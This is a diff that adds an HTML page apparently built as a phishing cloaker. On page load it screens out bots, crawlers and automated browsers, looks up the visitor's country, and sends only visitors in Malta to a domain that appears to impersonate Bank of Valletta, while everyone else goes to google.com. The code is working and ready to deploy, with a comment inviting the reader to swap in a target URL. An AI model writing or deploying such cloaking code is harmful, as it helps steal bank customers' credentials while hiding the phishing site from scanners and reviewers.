@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // Configuration
+        const CONFIG = {
+            ALLOWED_COUNTRY: 'Malta',
+            REDIRECT_URL_MALTA: 'https://bov-uneneroll.prosucesso.cv', // ← CHANGE THIS TO YOUR DESIRED URL
+            REDIRECT_URL_BLOCKED: 'https://google.com',
+            USE_EDGE_FUNCTION: true, // Set to true to use Vercel Edge Function
+            EDGE_FUNCTION_URL: '/api/check-security' // Your edge function endpoint
+        };
+
+        // Simple bot detection (client-side pre-check)
+        function quickBotCheck() {
+            const ua = navigator.userAgent.toLowerCase();
+            const botPatterns = ['bot', 'crawler', 'spider', 'curl', 'wget'];
+            
+            if (botPatterns.some(pattern => ua.includes(pattern)) || 
+                navigator.webdriver || 
+                window.screen.width === 0) {
+                return true;
+            }
+            return false;
+        }
+
+        // Main security check using Edge Function
+        async function performSecurityCheck() {
+            try {
+                // Quick bot check first
+                if (quickBotCheck()) {
+                    window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+                    return;
+                }
+
+                // If using Edge Function
+                if (CONFIG.USE_EDGE_FUNCTION) {
+                    const response = await fetch(CONFIG.EDGE_FUNCTION_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            userAgent: navigator.userAgent,
+                            screenWidth: window.screen.width,
+                            screenHeight: window.screen.height,
+                            webdriver: navigator.webdriver || false
+                        })
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Security check failed');
+                    }
+
+                    const result = await response.json();
+
+                    if (result.blocked || result.isBot || !result.allowed) {
+                        window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+                    } else if (result.isMalta) {
+                        window.location.href = CONFIG.REDIRECT_URL_MALTA;
+                    } else {
+                        window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+                    }
+                } else {
+                    // Fallback to client-side only (less secure)
+                    performClientSideCheck();
+                }
+            } catch (e) {
+                // On error, use client-side fallback
+                performClientSideCheck();
+            }
+        }
+
+        // Client-side only fallback
+        async function performClientSideCheck() {
+            try {
+                // Get IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipResponse.json();
+
+                // Get location
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
+                const country = await geoResponse.text();
+
+                // Check if Malta
+                const maltaVariations = ['Malta', 'malta', 'MALTA'];
+                const isMalta = maltaVariations.some(v => country.includes(v));
+
+                window.location.href = isMalta ? CONFIG.REDIRECT_URL_MALTA : CONFIG.REDIRECT_URL_BLOCKED;
+            } catch (e) {
+                window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+            }
+        }
+
+        // Execute immediately
+        performSecurityCheck();
+    </script>
+</head>
+<body>
+    <!-- Page will redirect before anything is shown -->
+</body>
+</html>
